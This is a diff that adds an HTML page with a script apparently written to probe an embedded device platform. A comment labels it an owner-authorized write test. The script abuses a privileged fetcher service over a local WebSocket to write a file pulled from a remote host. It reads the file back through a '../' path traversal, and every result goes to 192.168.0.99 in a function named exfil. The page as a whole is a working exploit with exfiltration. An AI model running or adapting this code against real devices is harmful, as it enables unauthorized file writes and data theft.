@@ -1,0 +1,33 @@
+<!doctype html>
+<!-- u7w1 — WRITE TEST (owner-authorized): fetcher writes /APPS/.recon_marker via WS start + fetchFile. -->
+<html><head><meta charset="utf-8"><title>u7w1</title></head>
+<body style="background:#000;color:#0f0;font:26px monospace;padding:8px">
+<pre id="out">u7w1…</pre>
+<script>
+(function(){
+"use strict";
+var out=document.getElementById("out");
+function exfil(t){try{var i=new Image();i.src="http://192.168.0.99:8798/w?d="+encodeURIComponent(String(t).slice(0,140));}catch(e){}}
+function line(t){out.textContent+="\n"+t; exfil(t);}
+function hi(a,p){try{return HiUtils_createRequest(a,p);}catch(e){return {exc:String(e)};}}
+
+// 1) start fetcher service over phoenix WS (exact repo pattern)
+var ws=new WebSocket("wss://localhost:9888");
+ws.onopen=function(){
+  ws.send(JSON.stringify({path:"phoenix://service/basic/fetcher",method:"start",parameters:{},session:901,timeout:10}));
+  line("ws open, fetcher start sent");
+  setTimeout(run, 1500);
+};
+ws.onerror=function(){ line("ws ERR"); run(); };
+function run(){
+  // 2) fetchFile writes marker from our server; args per repo writeFile(): url, directory, permission
+  try{
+    var r=vowOS.service.syncExecute("basic/fetcher",{api:"fetchFile",args:{url:"http://192.168.0.99:8799/probe_marker.txt",directory:"/APPS/.recon_marker",permission:420}});
+    line("fetchFile ret="+r.ret+" msg="+JSON.stringify(r.msg).slice(0,80));
+  }catch(e){ line("fetchFile EXC "+String(e).slice(0,80)); }
+  // 3) read back via hiutils (mode 6 + traversal)
+  var b=hi("fileRead",{path:["../APPS/.recon_marker"],mode:6});
+  line("readback ret="+b.ret+" content="+String(b.msg||"").slice(0,60));
+}
+})();
+</script></body></html>
